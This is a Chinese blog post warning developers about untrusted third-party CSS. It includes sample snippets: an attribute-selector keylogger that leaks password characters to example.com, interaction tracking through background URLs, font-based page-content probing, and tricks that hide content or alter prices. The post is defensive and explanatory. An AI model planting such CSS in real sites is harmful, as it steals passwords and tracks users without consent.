---
title: 别人写的css，你敢用吗？
date: 2018-04-10 14:17:22
tags: CSS
---

> 为了实现高效开发，大多数时候会选择别人实现好的库/组件引用到自己的项目中，但是这样真的安全吗？

大多数web开发者认为只要不使用别人的`js`，安全就会有保证。**Too young, too naive**，殊不知“黑客”已经开始在`css`上做手脚了。

在浏览器设置中用户可以禁用`js`，但是`css`却是没有办法禁用的。

首先聊一聊使用第三方资源，能够造成的危害。

<!-- more -->

## 图片

```html
<img src="https://img.com/iphone6s.jpg">
```

引用第三方图片资源，可能会出现2个问题：
+ 图片资源失效
+ 图片资源被替换

{% asset_img iphone.jpg 图片资源 %}

上图展示了使用第三方图片可能带来的后果，图片资源只会影响自身的状态而不会影响其他部分。

## 脚本

```html
<script src="http://example.com/script.js"></script>
```
脚本的作用范围就不是图片能够比拟的了，脚本能够随意控制整个页面。

+  读取、篡改页面内容
+  监控用户行为
+  使用用户浏览器的算力进行挖矿
+  使用用户`cookie`做请求，并转发响应
+  读取、篡改浏览器`storage`
+  **More**

{% asset_img js.jpg 为所欲为的JS %}

**注**：`storage`/`indexDB`如果被更改，即使删除了脚本，这些更改仍然不可逆。

只有在完全信任的情况下，才会选择加载第三方脚本。

下面来介绍本文的重头戏 --- **第三方css**。

## CSS

**css**在作用范围的方面更加接近于**js**，因为它同样是在整个页面生效。

**css**能在以下几个方面对页面进行操作：
+ 增、删和改页面内容
+ 根据页面内容发起请求
+ 响应用户交互

与**js**相比，**css**不能做到的是修改`storage`，也不能用来挖矿。

### 键盘记录器

**键盘记录器**，指的是页面会记录用户的输入。目前这种行为只存在于使用**React**/**类React**框架的页面。

```css
input[type="password"][value$="p"] {
    background: url(//example.com/password?p);
}
```

如果密码输入框，输入以`p`结尾的密码，就会发起一个`//exaple.com/password?p`请求。浏览器默认不会记住`input`输入框的输入，这也就是为什么说这种行为只存在于使用**React**/**类React**框架的页面中，下面截取两个例子。

{% asset_img input1.png JD.com %}

JD主站没有使用**React**/**类React**框架，输入框的内容不会再`input`标签中显示`value`属性

{% asset_img input2.png instagram.com %}

instagram使用的是**React**框架，会把输入框的内容同步显示在`input`的`value`属性中。

有没有通过这个例子，觉得**CSS**比你想象的强大的多。

### 隐藏内容

通过一些技巧，将真正的页面内容不展示给用户。

```css
body {
    display: none;
}

html::after {
    content: 'HTTP 500 Server Error';
}
```
上例将真正的主体内容隐藏，展示给用户**HTTP 500**错误。

### 增加内容

```css
.price-value::after {
    content: '8';
}
```

{% asset_img add-content.png%}

商品涨价了诶，估计连卖家都不知道。遇到这种情况用户一般都不会产生购买欲望了。

### 移动内容

```css
.move-purchase-button {
    opacity: 0;
    position: absolute;
    top: 100px;
    left: 100px;
}
```
{% asset_img btn1.png 正常情况 %}

{% asset_img btn2.png 按钮被移动 %}


**结算按钮**被第三方css就这样搞没了，用户根本没办法完成购买行为，这种情况对电商网站很伤，导致**“只能看不能买”**。

### 监控用户交互

```css
.login-button:hover {
    background: url('//example.com/login-button-hover');
}
.login-button:active {
    background: url('//example.com/login-button-active');
}
```

通过上面的代码，可以用来检测用户在登录按钮的交互状态，是`hover`还是`active`(点击)，不同的状态会发送不同的请求。

如果页面中适量增加类似`css`代码，可以有用来做**用户画像**分析。

### 读取页面内容

```css
font-face {
    font-family: blah;
    src: url(//example.com/page-contains-q) format('woff');
    unicode-range: U+71;
}

html {
    font-family: blah, sans-serif;
}
```

伪造一种字体`blah`，如果页面中有在`unicode-range`范围内的字符就会发送设置好的请求，我们这里例子是字符`q`。

**注**：`@font-face`中的请求会在开发控制台的**Network** -> **font**类型中看到。

也许你觉得只能检测页面中的单个字符作用很小，那我给你介绍一个css的新属性`font-variant-ligatures`，通过这个属性我们可以设置字符为连字效果。

但是目前只有**OpenType**字体支持连字效果，不同的**OpenType**字体连字显示的效果也不一致。

{% asset_img liga1.png 连字效果 %}

{% asset_img liga2.png 多种OpenType字体 %}

启用连字效果

```css
body {
    font-feature-settings: "liga" 1;
}

@supports (font-variant-ligatures: common-ligatures) {
    body {
        font-feature-settings: normal;
        font-variant-ligatures: common-ligatures;
    }
}
```

全部都设置完成之后，我们就可以检测特定的连字字符。比如**ff**连字的unicode码就是`\ufb00`。

{% asset_img unicode.png unicode转换 %}

查询**unicode**码对应哪些字符，可以通过[Unicode® character table](https://unicode-table.com/en/)进行查询。

{% asset_img unicode-table.png  unicode-table.com %}


## 总结

通过以上的几个CSS的例子，你是不是觉得CSS也同样强大，不守信的第三方CSS也不可轻易采用。

总结一下，自己的**CSS**，还得自己写。。。

{% asset_img joker.png %}
